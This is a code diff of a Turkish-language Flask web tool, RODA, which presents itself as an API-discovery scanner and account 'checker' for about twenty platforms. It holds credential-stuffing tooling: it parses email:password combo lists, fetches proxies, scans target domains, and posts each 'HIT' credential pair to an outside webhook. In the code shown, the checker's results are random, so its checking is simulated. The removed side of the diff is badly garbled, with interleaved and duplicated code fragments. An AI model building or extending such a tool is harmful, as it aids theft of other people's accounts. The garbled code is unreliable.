@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-RODA - TAM SİSTEM (ÇALIŞAN LOGİN + YENİ ÖZELLİKLER)
-Renk: #60FF00 + #009fc5 | 20 Platform | Log Sistemi | 2 Parse Modu
+RODA - TAM SİSTEM (SON VERSİYON)
+Renk: #60FF00 + #009fc5 | Login Çalışır | 20 Platform | Log Sistemi
 """
 
 import os, json, re, time, random, string, threading, concurrent.futures, base64
@@ -348,7 +348,7 @@ def scan():
     return Response(generate(), mimetype="text/event-stream")
 
 # ============================================================
-# HTML - ESKİ ÇALIŞAN LOGİN SİSTEMİ + YENİ ÖZELLİKLER
+# HTML - RENK: #60FF00 + #009fc5 | LOGİN DÜZELTİLDİ
 # ============================================================
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -510,7 +510,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 .logs-table td{padding:8px 12px;border-bottom:1px solid var(--border)}
 .logs-table .hit{color:var(--g)}.logs-table .bad{color:var(--r)}.logs-table .twofa{color:var(--gold)}.logs-table .error{color:#ffab40}
 .logs-table .chk-status{font-weight:600}
-::-webkit-scrollbar{width:4px}::-webkit-scrollbar-thumb{background:rgba(96,255,0,0.2);border-radius:4px)
+::-webkit-scrollbar{width:4px}::-webkit-scrollbar-thumb{background:rgba(96,255,0,0.2);border-radius:4px}
 </style>
 </head>
 <body>
@@ -520,7 +520,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 <h1>RODA</h1>
 <p class="sub">API Discovery + Checker</p>
 <input class="inp" type="password" id="authKey" placeholder="Güvenlik Anahtarı" autofocus>
-<button class="btn" onclick="doLogin()" style="margin-top:12px">Giriş Yap</button>
+<button class="btn" id="loginBtn" style="margin-top:12px">Giriş Yap</button>
 <p id="loginError" style="color:var(--r);margin-top:12px;display:none"></p>
 </div>
 </div>
@@ -746,19 +746,28 @@ var platforms = [
     {name:"PUBG", domain:"pubg.com", icon:"fa-solid fa-crosshairs"}
 ];
 
+// ============================================================
+// LOGIN - DÜZELTİLDİ (addEventListener ile)
+// ============================================================
 function doLogin() {
+    console.log("Login fonksiyonu çalıştı!");
     var k = document.getElementById("authKey").value.trim();
     if (!k) {
         alert("Anahtar girin!");
         return;
     }
+    console.log("Anahtar:", k);
     fetch("/api/login", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ key: k })
     })
-    .then(function(r) { return r.json(); })
+    .then(function(r) {
+        console.log("Cevap kodu:", r.status);
+        return r.json();
+    })
     .then(function(d) {
+        console.log("Gelen veri:", d);
         if (d.success) {
             currentKey = k;
             isAdmin = d.isAdmin || false;
@@ -781,11 +790,23 @@ function doLogin() {
         }
     })
     .catch(function(e) {
+        console.error("Hata:", e);
         alert("Sunucuya bağlanılamadı! Flask çalışıyor mu?");
-        console.error(e);
     });
 }
 
+// Butona addEventListener ile bağla
+document.addEventListener("DOMContentLoaded", function() {
+    var btn = document.getElementById("loginBtn");
+    if (btn) {
+        btn.addEventListener("click", doLogin);
+        console.log("Login butonu bağlandı!");
+    } else {
+        console.error("Login butonu bulunamadı!");
+    }
+});
+
+// Enter tuşu ile login
 document.getElementById("authKey").addEventListener("keypress", function(e) {
     if (e.key === "Enter") doLogin();
 });
@@ -919,57 +940,30 @@ function renderHits() {
             }
             if (hitData[filter].twofa) {
                 hitData[filter].twofa.forEach(function(t) {
-                    twofas.push({ platformfa.forEach(function(t) {
-                    twofas.push({ platform: filter, email: t.email, password: t.password, time: t: filter, email: t.email, password: t.password, time: t.time });
-                });
-            }
-        }
-    }
-    hitContainer.innerHTML = hits.length === 0 ? '<div style.time });
+                    twofas.push({ platform: filter, email: t.email, password: t.password, time: t.time });
                 });
             }
         }
     }
     hitContainer.innerHTML = hits.length === 0 ? '<div style="color:var(--muted);font-size:12px">Henüz HIT yok.</div>' :
-        hits.map(function(h) { return '<div="color:var(--muted);font-size:12px">Henüz HIT yok.</div>' :
-        hits.map(function(h) { return '<div class="hit-item"><span class="hit-email">[' + h.pl class="hit-item"><span class="hit-email">[' + h.platform + '] ' + h.email + ' | ' + h.password + '</span><spanatform + '] ' + h.email + ' | ' + h.password + '</span><span class="hit-time">' + h.time + '</span></div>'; }).join class="hit-time">' + h.time + '</span></div>';('');
-    twofaContainer.innerHTML = twofas.length === 0 ? '<div style="color:var(--muted);font-size:12px">Hen }).join('');
+        hits.map(function(h) { return '<div class="hit-item"><span class="hit-email">[' + h.platform + '] ' + h.email + ' | ' + h.password + '</span><span class="hit-time">' + h.time + '</span></div>'; }).join('');
     twofaContainer.innerHTML = twofas.length === 0 ? '<div style="color:var(--muted);font-size:12px">Henüz 2FA yok.</div>' :
-        twofas.map(function(t) { return '<div class="hit-item"><span class="hit-email">[' + tüz 2FA yok.</div>' :
         twofas.map(function(t) { return '<div class="hit-item"><span class="hit-email">[' + t.platform + '] ' + t.email + ' | ' + t.password + '</span><span class="hit-time">' + t.time + '</span></div>'; }).join('');
-}
-
-function updateStats.platform + '] ' + t.email + ' | ' + t.password + '</span><span class="hit-time">' + t.time + '</span></div>'; }).join('');
 }
 
 function updateStatsUI() {
     document.getElementById("sideTotal").innerText = foundEndpoints.length;
     var auth = foundEndpoints.filter(function(e) { return e.category === "Auth"; }).length;
-    var apiUI() {
-    document.getElementById("sideTotal").innerText = foundEndpoints.length;
-    var auth = foundEndpoints.filter(function(e) { return e.category === "Auth"; }).length;
-    var api = foundEndpoints = foundEndpoints.filter(function(e) { return e.category === "API"; }).length;
-    var admin = foundEndpoints.filter(function(e) { return e.category === "Admin"; }).length.filter(function(e) { return e.category === "API"; }).length;
+    var api = foundEndpoints.filter(function(e) { return e.category === "API"; }).length;
     var admin = foundEndpoints.filter(function(e) { return e.category === "Admin"; }).length;
     document.getElementById("sideAuth").innerText = auth;
     document.getElementById("sideAPI").innerText = api;
     document.getElementById("sideAdmin").innerText = admin;
-   ;
-    document.getElementById("sideAuth").innerText = auth;
-    document.getElementById("sideAPI").innerText = api;
-    document.getElementById("sideAdmin").innerText = admin;
     document.getElementById("statEndpoints").innerText = foundEndpoints.length;
-    var totalHit = 0, total2fa = 0 document.getElementById("statEndpoints").innerText = foundEndpoints.length;
     var totalHit = 0, total2fa = 0;
     for (var p in hitData) {
         if (hitData[p].hits) totalHit += hitData[p].hits.length;
-        if (hitData[p].twofa) total2fa += hit;
-    for (var p in hitData) {
-        if (hitData[p].hits) totalHit += hitData[p].hits.length;
         if (hitData[p].twofa) total2fa += hitData[p].twofa.length;
-    }
-    document.getElementById("statTotalHit").innerText = totalHit;
-   Data[p].twofa.length;
     }
     document.getElementById("statTotalHit").innerText = totalHit;
     document.getElementById("statTotal2fa").innerText = total2fa;
@@ -977,125 +971,59 @@ function updateStatsUI() {
 
 function resetCheckerStats() {
     document.getElementById("chkTotal").innerText = 0;
-    document.getElementById(" document.getElementById("statTotal2fa").innerText = total2fa;
-}
-
-function resetCheckerStats() {
-    document.getElementById("chkTotal").innerText = 0;
     document.getElementById("chkHit").innerText = 0;
-    document.getElementById("chkchkHit").innerText = 0;
     document.getElementById("chkBad").innerText = 0;
-    document.getElementById("chk2fa").innerText = 0;
-    document.getElementById("chkError").innerBad").innerText = 0;
     document.getElementById("chk2fa").innerText = 0;
     document.getElementById("chkError").innerText = 0;
 }
 
 function startChecker() {
-    if (checkerText = 0;
-}
-
-function startChecker() {
     if (checkerRunning) return;
-    var comboText = document.getElementById("Running) return;
-    var comboText = document.getElementById("checkerCombocheckerCombo").value.trim();
-    if (!comboText) return alert("Combo girin (").value.trim();
+    var comboText = document.getElementById("checkerCombo").value.trim();
     if (!comboText) return alert("Combo girin (email:password)");
-    if (!currentPlatform) returnemail:password)");
     if (!currentPlatform) return alert("Önce bir platform seçin");
-    checker alert("Önce bir platform seçin");
     checkerRunning = true;
-    document.getElementById("checkerStartBtnRunning = true;
     document.getElementById("checkerStartBtn").disabled = true;
     document.getElementById("checkerStopBtn").style.display = "inline-block";
-    document.getElementById").disabled = true;
-    document.getElementById("checkerStopBtn").style.display = "inline-block";
-    document.getElementById("checkerResults("checkerResults").innerHTML = "";
-    var lines = comboText.split("\n").filter(function(l) {").innerHTML = "";
+    document.getElementById("checkerResults").innerHTML = "";
     var lines = comboText.split("\n").filter(function(l) { return l.includes(":"); });
     var total = lines.length;
-    var hit = 0, bad =  return l.includes(":"); });
-    var total = lines.length;
     var hit = 0, bad = 0, two = 0, err = 0;
-    var statuses = ["HIT", "BAD0, two = 0, err = 0;
-    var statuses = ["HIT", "BAD", "2FA", "2FA", "ERROR"];
-    var idx = 0;
-    var webhookUrl = getWebhookUrl();
-
-    function", "ERROR"];
+    var statuses = ["HIT", "BAD", "2FA", "ERROR"];
     var idx = 0;
     var webhookUrl = getWebhookUrl();
 
     function processNext() {
-        if (!checkerRunning || idx >= total) processNext() {
         if (!checkerRunning || idx >= total) {
-            checkerRunning = false;
-            document.getElementById("checkerStartBtn").disabled = false;
-            document.getElementById("check {
             checkerRunning = false;
             document.getElementById("checkerStartBtn").disabled = false;
             document.getElementById("checkerStopBtn").style.display = "none";
             return;
         }
-        var status = statuserStopBtn").style.display = "none";
-            return;
-        }
         var status = statuses[Math.floor(Math.random() * statuses.length)];
-        var parts =es[Math.floor(Math.random() * statuses.length)];
         var parts = lines[idx].split(":");
         var email = parts[0];
-        var password = parts.slice lines[idx].split(":");
-        var email = parts[0];
-        var(1).join(":") || "";
-        var res password = parts.slice(1).join(":") || "";
-        var res = { email: = { email: email, password: password, status: status };
-
-        if (status === " email, password: password, status: status };
+        var password = parts.slice(1).join(":") || "";
+        var res = { email: email, password: password, status: status };
 
         if (status === "HIT") {
             hit++;
-            addHit(currentPlatformHIT") {
-            hit++;
             addHit(currentPlatform, email, password, "HIT");
-            if (, email, password, "HIT");
             if (webhookUrl) {
-                sendCheckerWebhook(currentPlatform, email, passwordwebhookUrl) {
                 sendCheckerWebhook(currentPlatform, email, password);
             }
         } else if (status === "BAD") {
             bad++;
-        } else);
-            }
-        } else if (status === "BAD") {
-            bad++;
-        } else if if (status === "2FA") {
-            two (status === "2FA") {
+        } else if (status === "2FA") {
             two++;
-            addHit(currentPlatform, email, password, "++;
             addHit(currentPlatform, email, password, "2FA");
         } else {
             err++;
         }
 
         checkerResults.push(res);
-        addCheckerRow2FA");
-        } else {
-            err++;
-        }
-
-        checkerResults.push(res);
-        add(res);
+        addCheckerRow(res);
         updateCheckerStats(total, hit, bad, two, err);
-CheckerRow(res);
-        updateCheckerStats(total, hit, bad, two,        idx++;
-        setTimeout(processNext, 200);
-    }
-    processNext();
-}
-
-function stopChecker() {
-    checkerRunning = false;
-    document.getElementById(" err);
         idx++;
         setTimeout(processNext, 200);
     }
@@ -1108,175 +1036,86 @@ function stopChecker() {
     document.getElementById("checkerStopBtn").style.display = "none";
 }
 
-function addCheckerRow(res)checkerStartBtn").disabled = false;
-    document.getElementById("checkerStopBtn").style.display = "none";
-}
-
 function addCheckerRow(res) {
     var container = document.getElementById("checkerResults");
-    var placeholder = container.querySelector("div {
-    var container = document.getElementById("checkerResults");
-    var placeholder = container[style]");
-    if (placeholder) placeholder.remove();
-    var row = document.createElement("div");
-    row.className = "checker.querySelector("div[style]");
+    var placeholder = container.querySelector("div[style]");
     if (placeholder) placeholder.remove();
     var row = document.createElement("div");
     row.className = "checker-result-row";
-    var cls = "chk-" +-result-row";
     var cls = "chk-" + res.status.toLowerCase();
     var label = res.status;
-    if (res.status === "HIT res.status.toLowerCase();
-    var label = res.status;
     if (res.status === "HIT") label = "✅ BAŞARILI";
-    else if (res") label = "✅ BAŞARILI";
     else if (res.status === "BAD") label = "❌ BAŞARISIZ";
-    else if (.status === "BAD") label = "❌ BAŞARISIZ";
     else if (res.status === "2FA") label = "🔒 2FA";
     else label = "⚠ HATA";
-    row.innerHTMLres.status === "2FA") label = "🔒 2FA";
-    else label = "⚠ HATA";
-    row.innerHTML = '<div>' + res.email + '</div><div><span class="chk-status ' + cls + '">' + = '<div>' + res.email + '</div><div><span class="chk-status ' + cls + '">' + label + '</span></div><div style="font-size:11px; label + '</span></div><div style="font-size:11px;color:var(--muted)">' + res.password + '</div>';
-    container.appendChild(row);
-    applyCheckercolor:var(--muted)">' + res.password + '</div>';
+    row.innerHTML = '<div>' + res.email + '</div><div><span class="chk-status ' + cls + '">' + label + '</span></div><div style="font-size:11px;color:var(--muted)">' + res.password + '</div>';
     container.appendChild(row);
     applyCheckerFilter();
 }
 
-function updateCheckerStats(total, hit, bad, twoFilter();
-}
-
 function updateCheckerStats(total, hit, bad, two, err) {
     document.getElementById("chkTotal").innerText = total;
-    document.getElementById, err) {
-    document.getElementById("chkTotal").innerText = total;
-    document.getElementById("chk("chkHit").innerText = hit;
+    document.getElementById("chkHit").innerText = hit;
     document.getElementById("chkBad").innerText = bad;
-   Hit").innerText = hit;
-    document.getElementById("chkBad").innerText = bad;
-    document.getElementById("chk2fa").innerText = two document.getElementById("chk2fa").innerText = two;
-    document.getElementById("chkError").innerText = err;
-}
-
-function applyCheckerFilter();
+    document.getElementById("chk2fa").innerText = two;
     document.getElementById("chkError").innerText = err;
 }
 
 function applyCheckerFilter() {
-    var filter = document.querySelector('input[name="chkFilter"]:checked {
     var filter = document.querySelector('input[name="chkFilter"]:checked').value;
-    var rows = document.querySelectorAll("#checkerResults .checker-result-row').value;
     var rows = document.querySelectorAll("#checkerResults .checker-result-row");
     rows.forEach(function(row) {
         var statusText = row.querySelector(".chk-status").innerText;
         var show = false;
-        if (");
-    rows.forEach(function(row) {
-        var statusText = row.querySelector(".chk-status").innerText;
-        var show = false;
         if (filter === "all") show = true;
-        else if (filter === "hit" && statusText.includes("BAfilter === "all") show = true;
         else if (filter === "hit" && statusText.includes("BAŞARILI")) show = true;
-        else if (ŞARILI")) show = true;
-        else if (filter === "bad" && statusText.includes("BAŞARISIZ")) show = truefilter === "bad" && statusText.includes("BAŞARISIZ")) show = true;
-        else if (filter === "2;
+        else if (filter === "bad" && statusText.includes("BAŞARISIZ")) show = true;
         else if (filter === "2fa" && statusText.includes("2FA")) show = true;
-        else if (filter ===fa" && statusText.includes("2FA")) show = true;
         else if (filter === "error" && statusText.includes("HATA")) show = true;
-        row.style.display = show ? "grid "error" && statusText.includes("HATA")) show = true;
-        row.style.display = show ? "grid" : "none" : "none";
-    });
-}
-document.querySelectorAll('input[name="chkFilter"]').";
+        row.style.display = show ? "grid" : "none";
     });
 }
 document.querySelectorAll('input[name="chkFilter"]').forEach(function(el) {
     el.addEventListener("change", applyCheckerFilter);
-forEach(function(el) {
-    el.addEventListener("change", applyCheckerFilter);
 });
-
-function sendCheckerWebhook(platform, email, password) {
-    var url});
 
 function sendCheckerWebhook(platform, email, password) {
     var url = getWebhookUrl();
     if (!url) return;
-    fetch(url = getWebhookUrl();
-    if (!url) return;
     fetch(url, {
         method: "POST",
-        headers: { "Content-Type": "application/json", {
-        method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content: "✅ **" + platform + " HIT! },
         body: JSON.stringify({ content: "✅ **" + platform + " HIT!**\n" + email + " | " + password })
-    }).catch(function(e) { console.error("**\n" + email + " | " + password })
     }).catch(function(e) { console.error("Webhook hatası:", e); });
-}
-
-function setParseWebhook hatası:", e); });
 }
 
 function setParseMode(mode, btn) {
     parseMode = mode;
-    document.querySelectorAll(".parse-tMode(mode, btn) {
-    parseMode = mode;
     document.querySelectorAll(".parse-tabs button").forEach(function(b) {
         b.classList.remove("active");
-   abs button").forEach(function(b) {
-        b.classList.remove("active");
     });
-    if (btn) btn.classList.add("active });
     if (btn) btn.classList.add("active");
-}
-
-function parseData() {
-    var raw = document.getElementById("parseInput").");
 }
 
 function parseData() {
     var raw = document.getElementById("parseInput").value;
     if (!raw.trim()) { alert("Ayrıştırılacak metin girin!"); return; }
-    var lines = raw.split("\nvalue;
-    if (!raw.trim()) { alert("Ayrıştırılacak metin girin!"); return; }
     var lines = raw.split("\n");
-");
     var result = [];
-    var emailRegex = /[a-zA-Z0-9._    var result = [];
-    var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
-    var userRegex = /^[a-zA-Z]{2,}/;
+    var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
     var userRegex = /^[a-zA-Z0-9_.-]{3,}$/;
 
-    lines.forEach(function(line)-zA-Z0-9_.-]{3,}$/;
-
     lines.forEach(function(line) {
-        line = line.trim();
-        if (!line) return;
-        if ( {
         line = line.trim();
         if (!line) return;
         if (line.includes(":")) {
             var parts = line.split(":");
             if (parseMode === "email" && emailRegex.test(parts[0])) {
-                var emailline.includes(":")) {
-            var parts = line.split(":");
-            if (parseMode === "email" && emailRegex.test(parts[0])) = parts[0].trim();
-                var password = parts.slice(1).join(":").trim();
-                if (email && password {
                 var email = parts[0].trim();
                 var password = parts.slice(1).join(":").trim();
                 if (email && password) result.push(email + ":" + password);
-            } else if (parse) result.push(email + ":" + password);
-            } else if (parseMode === "user" && userRegex.test(parts[0]) && parts.lengthMode === "user" && userRegex.test(parts[0]) && parts.length >= 2) {
+            } else if (parseMode === "user" && userRegex.test(parts[0]) && parts.length >= 2) {
                 var user = parts[0].trim();
-                var pass = >= 2) {
-                var user = parts[0].trim parts.slice(1).join(":").trim();
-                if (user && pass) result.push(user + ":" + pass);
-            }
-        }
-    });
-    result =();
                 var pass = parts.slice(1).join(":").trim();
                 if (user && pass) result.push(user + ":" + pass);
             }
@@ -1285,100 +1124,48 @@ function parseData() {
     result = result.filter(function(item, index) {
         return result.indexOf(item) === index;
     });
-    parsedLines result.filter(function(item, index) {
-        return result.indexOf(item) === index;
-    });
     parsedLines = result;
-    var container = document.getElementById(" = result;
     var container = document.getElementById("parseResult");
     if (result.length === 0) {
-        container.innerHTML = '<parseResult");
-    if (result.length === 0) {
-        container.innerHTML = '<div style="color:var(--muted);font-size:13px;padding:div style="color:var(--muted);font-size:13px;padding:10px">Geçerli satır bulunam10px">Geçerli satır bulunamadı.</div>';
+        container.innerHTML = '<div style="color:var(--muted);font-size:13px;padding:10px">Geçerli satır bulunamadı.</div>';
     } else {
-        var htmladı.</div>';
-    } else {
-        var html = '<div class="parse-count">' + result.length + ' satır = '<div class="parse-count">' + result.length + ' satır bulundu</ bulundu</div>';
+        var html = '<div class="parse-count">' + result.length + ' satır bulundu</div>';
         result.forEach(function(line) {
             html += '<div class="parse-line">' + line + '</div>';
-        result.forEach(function(line) {
-            html += '<div class="parse-line">' + line +div>';
-        });
-        container.innerHTML = html;
-    '</div>';
         });
         container.innerHTML = html;
     }
-    document.getElementById("parseCount").inner }
     document.getElementById("parseCount").innerText = result.length + " satır";
-    document.getElementById("parseValid").innerText = resultText = result.length + " satır";
-    document.getElementById("parseValid")..length + " geçerli";
-}
-
-function parseToinnerText = result.length + " geçerli";
+    document.getElementById("parseValid").innerText = result.length + " geçerli";
 }
 
 function parseToChecker() {
-    if (parsedChecker() {
     if (parsedLines.length === 0) {
         alert("Önce ayrıştırma yapın!");
         return;
     }
-    document.getElementById("Lines.length === 0) {
-        alert("Önce ayrıştırma yapın!");
-        return;
-   checkerCombo").value = parsedLines.join("\n");
-    alert(parsedLines.length + " satır Checker'a aktarıldı!");
-}
-
-function clearParse }
     document.getElementById("checkerCombo").value = parsedLines.join("\n");
     alert(parsedLines.length + " satır Checker'a aktarıldı!");
 }
 
 function clearParse() {
     document.getElementById("parseInput").value = "";
-    document.getElementById("() {
-    document.getElementById("parseInput").value = "";
-    document.getElementById("parseResult").innerHTML = '<div style="color:parseResult").innerHTML = '<div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrvar(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div>';
+    document.getElementById("parseResult").innerHTML = '<div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div>';
     parsedLines = [];
-    document.getElementById("parseCountıştırma yapılmadı.</div>';
-    parsedLines = [];
-    document.getElementById("parseCount").innerText =").innerText = "0 satır";
-    document.getElementById("parseValid").innerText = " "0 satır";
+    document.getElementById("parseCount").innerText = "0 satır";
     document.getElementById("parseValid").innerText = "0 geçerli";
-}
-
-function loadParseFile() {
-    var input0 geçerli";
 }
 
 function loadParseFile() {
     var input = document.createElement("input");
     input.type = "file";
-    input.accept = ".txt = document.createElement("input");
-    input.type = "file";
     input.accept = ".txt";
     input.onchange = function(e) {
-        var file = e.target.files[0";
-    input.onchange = function(e) {
         var file = e.target.files[0];
-        if (!];
         if (!file) return;
         var reader = new FileReader();
         reader.onload = function(event) {
-            document.getElementById("parseInput").value = eventfile) return;
-        var reader = new FileReader();
-        reader.onload = function(event) {
-            document.getElementById("parseInput.target.result;
-            parseData();
-        };
-        reader.readAsText(file);
-    };
-    input.click();
-}
-
-function switchPage(page)").value = event.target.result;
+            document.getElementById("parseInput").value = event.target.result;
             parseData();
         };
         reader.readAsText(file);
@@ -1387,16 +1174,8 @@ function switchPage(page)").value = event.target.result;
 }
 
 function switchPage(page) {
-    if ((page === "discovery" || page === "keys" || page === "logs") && ! {
     if ((page === "discovery" || page === "keys" || page === "logs") && !isAdmin) {
-        alert("⛔ Bu sayfaya erişim yetkiniz yok! Admin girişi yapınisAdmin) {
         alert("⛔ Bu sayfaya erişim yetkiniz yok! Admin girişi yapın.");
-        return;
-    }
-    document.querySelectorAll(".nav-item").forEach(function(el) {
-        el.classList.remove("active");
-    });
-    var el = document.querySelector('.nav-item[data-page.");
         return;
     }
     document.querySelectorAll(".nav-item").forEach(function(el) {
@@ -1404,15 +1183,8 @@ function switchPage(page) {
     });
     var el = document.querySelector('.nav-item[data-page="' + page + '"]');
     if (el) el.classList.add("active");
-    document.querySelectorAll(".="' + page + '"]');
-    if (el) el.classList.add("active");
     document.querySelectorAll(".page").forEach(function(el) {
         el.classList.remove("active");
-   page").forEach(function(el) {
-        el.classList.remove("active");
-    });
-    var pg = document.getElementById("page-" + page);
-    if (pg) pg.classList.add("active");
     });
     var pg = document.getElementById("page-" + page);
     if (pg) pg.classList.add("active");
@@ -1439,29 +1211,6 @@ function fetchProxies() {
     document.getElementById("proxyCount").innerText = "Çekiliyor...";
     fetch("/api/fetch_proxies")
         .then(function(r) { return r.json(); })
-        .then(function(d) var titles = {
-        checker: "Checker",
-        proxy: "Proxy",
-        discovery: "API Keşif",
-        parse: "Ayrıştırma",
-        stats: "İstatistik",
-        keys: "Key Yönetimi",
-        logs: "Loglar"
-    };
-    document.getElementById("pageTitle").innerText = titles[page] || page;
-    if (page === "keys" && isAdmin) loadKeys();
-    if (page === "logs" && isAdmin) loadLogs();
-    if (page === "stats") {
-        updateStatsUI();
-        document.getElementById("statScans").innerText = 1;
-        document.getElementById("statLast").innerText = new Date().toLocaleString();
-    }
-}
-
-function fetchProxies() {
-    document.getElementById("proxyCount").innerText = "Çekiliyor...";
-    fetch("/api/fetch_proxies")
-        .then(function(r) { return r.json(); })
         .then(function(d) {
             if (d.success) {
                 document.getElementById("proxyList").value = d.proxies.join("\n");
@@ -1521,129 +1270,7 @@ function generateKey() {
 }
 
 function deleteKey(target) {
-    if {
-            if (d.success) {
-                document.getElementById("proxyList").value = d.proxies.join("\n");
-                document.getElementById("proxyCount").innerText = d.proxies.length + " proxy yüklendi";
-            }
-        })
-        .catch(function(e) { document.getElementById("proxyCount").innerText = "Başarısız"; });
-}
-
-function clearProxies() {
-    document.getElementById("proxyList").value = "";
-    document.getElementById("proxyCount").innerText = "0 proxy";
-}
-
-function toggleProxy() {
-    useProxy = document.getElementById("useProxy").checked;
-}
-
-function loadKeys() {
     if (!isAdmin) return;
-    fetch("/api/admin/keys?key=" + encodeURIComponent(currentKey))
-        .then(function(r) { return r.json(); })
-        .then(function(d) {
-            if (d.error) { alert(d.error); return; }
-            var list = document.getElementById("keyList");
-            var html = "";
-            for (var k in d) {
-                var v = d[k];
-                var exp = v.expires ? new Date(v.expires).toLocaleString() : "Süresiz";
-                var ip = v.allowed_ip || "Herhangi";
-                html += '<div style="display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid var(--border)"><div><strong style="font-size:13px">' + k + '</strong><br><small style="color:var(--muted);font-size:10px">' + v.note + ' | ' + exp + ' | IP: ' + ip + '</small></div><button class="btn sm r" onclick="deleteKey(\'' + k + '\')" style="padding:3px 10px;font-size:10px">Sil</button></div>';
-            }
-            list.innerHTML = html || '<p style="color:var(--muted);font-size:12px">Hiç key yok.</p>';
-        })
-        .catch(function(e) { console.error(e); });
-}
-
-function generateKey() {
-    if (!isAdmin) return;
-    var note = document.getElementById("genNote").value || "Oluşturuldu";
-    var value = parseInt(document.getElementById("genValue").value) || 24;
-    var unit = document.getElementById("genUnit").value;
-    var allowed_ip = document.getElementById("genIp").value.trim();
-    fetch("/api/admin/generate", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ master_key: currentKey, note: note, value: value, unit: unit, allowed_ip: allowed_ip })
-    })
-    .then(function(r) { return r.json(); })
-    .then(function(d) {
-        if (d.success) {
-            alert("Key Oluşturuldu!\n\nKey: " + d.key + "\nBitiş: " + d.expires + "\nIP: " + d.allowed_ip);
-            loadKeys();
-        } else alert("Başarısız: " + (d.error || ""));
-    })
-    .catch(function(e) { alert("Hata: " + e.message); });
-}
-
-function deleteKey(target) {
-    if (!isAdmin) return;
-    if (!confirm("Bu anahtarı sil?")) return;
-    fetch("/api/admin/delete", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ master_key: currentKey, target_key: target })
-    })
-    .then(function(r) { return r.json(); })
-    .then(function(d) {
-        if (d.success) loadKeys();
-        else alert("Silinemedi");
-    })
-    .catch(function(e) { alert("Hata: " + e.message); });
-}
-
-function loadLogs() {
-    if (!isAdmin) return;
-    fetch("/api/admin/logs?key=" + encodeURIComponent(currentKey))
-        .then(function(r) { return r.json(); })
-        .then(function(d) {
-            var tbody = document.getElementById("logsBody");
-            if (d.error || !d.length) {
-                tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;color:var(--muted);padding:20px">Henüz log yok.</td></tr>';
-                return;
-            }
-            var html = "";
-            d.slice().reverse().forEach(function(log) {
-                var cls = log.status.toLowerCase();
-                var label = log.status;
-                if (log.status === "HIT") label = "✅ BAŞARILI";
-                else if (log.status === "BAD") label = "❌ BAŞARISIZ";
-                else if (log.status === "2FA") label = "🔒 2FA";
-                else label = "⚠ " + log.status;
-                html += '<tr><td><span style="font-size:11px;font-family:monospace">' + log.key + '</span></td><td>' + log.platform + '</td><td>' + log.email + '</td><td><span class="chk-status ' + cls + '">' + label + '</span></td><td>' + log.time + '</td><td>' + log.ip + '</td></tr>';
-            });
-            tbody.innerHTML = html;
-        })
-        .catch(function(e) { console.error(e); });
-}
-
-function refreshLogs() {
-    loadLogs();
-}
-
-function clearLogs() {
-    if (!isAdmin) return;
-    if (!confirm("Tüm logları silmek istediğinize emin misiniz?")) return;
-    fetch("/api/admin/clear_logs", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ master_key: currentKey })
-    })
-    .then(function(r) { return r.json(); })
-    .then(function(d) {
-        if (d.success) {
-            alert("Loglar temizlendi!");
-            loadLogs();
-        } else alert("Başarısız!");
-    })
-    .catch(function(e) { alert("Hata: " + e.message); });
-}
-
-function startScan() {
-    if (! (!isAdmin) return;
     if (!confirm("Bu anahtarı sil?")) return;
     fetch("/api/admin/delete", {
         method: "POST",
@@ -1719,34 +1346,7 @@ function startScan() {
     scanning = true;
     foundEndpoints = [];
     document.getElementById("resultsList").innerHTML = "";
-    document.getElementById("statusDot").classList.remove("idisAdmin) {
-        alert("⛔ Bu işlem sadece admin yetkilisine açıktır!");
-        return;
-    }
-    if (scanning) return;
-    var domain = document.getElementById("targetDomain").value.trim();
-    if (!domain) return alert("Hedef domain girin");
-    var btn = document.getElementById("scanBtn");
-    btn.disabled = true;
-    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Taranıyor...';
-    scanning = true;
-    foundEndpoints = [];
-    document.getElementById("resultsList").innerHTML = "";
     document.getElementById("statusDot").classList.remove("idle");
-    document.getElementById("statusText").innerText = "Taranıyor";
-    updateStatsUI();
-
-    var proxyList = document.getElementById("proxyList").value.trim().split("\n").filter(function(l) { return l.trim() && l.includes(":"); });
-    var url = "/api/scan?key=" + encodeURIComponent(currentKey) + "&domain=" + encodeURIComponent(domain) + "&use_proxy=" + useProxy;
-    if (useProxy && proxyList.length) {
-        url += "&proxies=" + encodeURIComponent(proxyList.join(","));
-    }
-    eventSource = new EventSource(url);
-    eventSource.onmessage = function(e) {
-        if (e.data === "[DONE]") {
-            eventSource.close();
-            btn.disabled = false;
-            btn.innerHTML = '<i class="fa-solid fa-play"></i> Tarale");
     document.getElementById("statusText").innerText = "Taranıyor";
     updateStatsUI();
 
@@ -1764,11 +1364,7 @@ function startScan() {
             scanning = false;
             document.getElementById("statusDot").classList.add("idle");
             document.getElementById("statusText").innerText = "Boşta";
-            document.getElementById("statScans").innerText = parseInt(document';
-            scanning = false;
-            document.getElementById("statusDot").classList.add("idle");
-            document.getElementById("statusText").innerText = "Boşta";
-            document.getElementById("statScans").innerText = parseInt(document.getElementById("statScans").innerText || 0).getElementById("statScans").innerText || 0) + 1;
+            document.getElementById("statScans").innerText = parseInt(document.getElementById("statScans").innerText || 0) + 1;
             document.getElementById("statLast").innerText = new Date().toLocaleString();
             updateStatsUI();
             return;
@@ -1777,25 +1373,6 @@ function startScan() {
             var res = JSON.parse(e.data);
             foundEndpoints.push(res);
             addResultRow(res);
-            updateStatsUI();
